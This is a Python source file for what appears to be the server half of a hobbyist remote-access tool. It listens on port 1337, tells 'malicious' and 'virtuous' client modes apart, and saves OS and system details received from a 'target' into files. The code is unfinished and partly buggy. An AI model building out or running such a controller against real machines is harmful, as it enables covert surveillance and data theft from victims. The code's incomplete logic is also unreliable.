import os
import random
import socket
import string
import sys
import time


class Server:
    def __init__(self, ip, port, buffer_size):
        self.IP = ip
        self.PORT = port
        self.BACKUP_PORT = 8080
        self.BUFFER_SIZE = buffer_size

        self.connections = []  # connections list
        self.info = ""  # info about target
        self.recvcounter = 0  # counter for received files

        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # try to update buffer size
    def updateBuffer(self, size):
        buff = ""
        for counter in range(0, len(size)):
            if size[counter].isdigit():
                buff += size[counter]

        return int(buff)

    # for big files
    def saveBigFile(self, size, buff):
        full = b''
        while True:
            print(str(sys.getsizeof(full)) + " " + str(size))
            if sys.getsizeof(full) >= size:
                print("escaped")
                break
            else:
                print(str(sys.getsizeof(full)) + " " + str(size))
            print("Waiting: ")
            recvfile = (self.client_socket.recv(buff))
            print(str(recvfile.decode()) + " HERE  ")
            full += recvfile

        return full

    def startServer(self):
        self.server.bind((self.IP, self.PORT))
        self.server.listen(2)

        self.acceptConnections()

    def acceptConnections(self):
        print(self.IP)
        print("*** Listening for incoming connections ***")

        self.client_socket, self.address = self.server.accept()
        print(f"*** Connection from {self.address} has been established! ***")
        self.connections.append(self.client_socket)
        # # safemode

        mode = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        print(mode)
        if mode == "2":
            print("Virtuous mode")
            self.connectionconfirm()
        else:
            print("Malicious mode")

        self.progress()
        # # print("hello worlds")

    def generatekey(self):
        # Creates a password containing uppercase, lowercase, numerical digits and punctuation.
        letters = (string.ascii_letters + string.digits + string.punctuation)
        code = ''.join(random.choices(letters, k=10))
        # print("Key =  " + code)
        return code

    def connectionconfirm(self):
        key = self.generatekey()
        print("Key =  " + key)

        self.client_socket.send(key.encode("utf-8"))

        response = self.client_socket.recv(self.BUFFER_SIZE).decode()
        if response == "MISMATCH":
            self.close()

    def progress(self):
        print("This was 100% successful")
        input()
        while True:
            #self.getTargetInfo()
            pass

    def disconn(self):
        command = "disconnect"
        self.client_socket.send(command.encode("utf-8"))
        print("*** Killed")

    def getTargetInfo(self):
        print("here")
        #command = "--ginfo"
        #self.client_socket.send(command.encode("utf-8"))

        info = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        print("info = "+  info)
        more = self.client_socket.recv(self.BUFFER_SIZE)
        print("more = "+str(more))
        ##### EVEN MORE IS LARGER THAN BUFFER SIZE ######
        emsize = self.client_socket.recv(self.BUFFER_SIZE).decode("UTF-8")
        print("emsize =" + str(emsize))
        if int(emsize) >= self.BUFFER_SIZE:
            print("bigboi")
            buff = self.updateBuffer(emsize)
            print("buffer = " + str(buff))
            evenmore = self.saveBigFile(int(emsize), buff)
            print("evenmore =" +  str(evenmore))
        else:
            evenmore = self.client_socket.recv(self.BUFFER_SIZE)
        moresysinfo = input("Would you like to see more?: ")
        if moresysinfo == "yes":
            print(more.decode())

        print(moresysinfo + "\n\n")
        """ writing additional information in a file """

        with open('../receivedfile/info.txt', 'wb+') as f, open('./logs/moreinfoS.txt', 'wb+') as m:
            f.write(more)
            m.write(evenmore)
            print("DONE")
        #with open('./logs/moreinfoS.txt', "rb+") as m:
            #print(m.read())
        print("\n# OS:" + info)
        print("# IP:" + self.address[0])
        print("*** Check info.txt for more details on the target ***")
        print("**** Check moreinfo.txt for even more details on the target ****")

        return info



def main():
    """ Creating the necessary dirs """

    try:
        os.mkdir('../receivedfile')
    except FileExistsError:
        pass

    # banner()
    time.sleep(1)

    HOSTNAME = socket.gethostname()
    IP = socket.gethostbyname(HOSTNAME)
    PORT = 1337  # int(input("[+] Listen on port> "))
    BUFFERSIZE = 2048

    server = Server(IP, PORT, BUFFERSIZE)

    try:
        server.startServer()
    except Exception as e:
        print("*** Error while starting the server:", str(e) + " ***")
    # just sending a message, for demonstration purposes
    message = "Hello and Welcome".encode()
    # server.client_socket.send(message)


if __name__ == "__main__":
    main()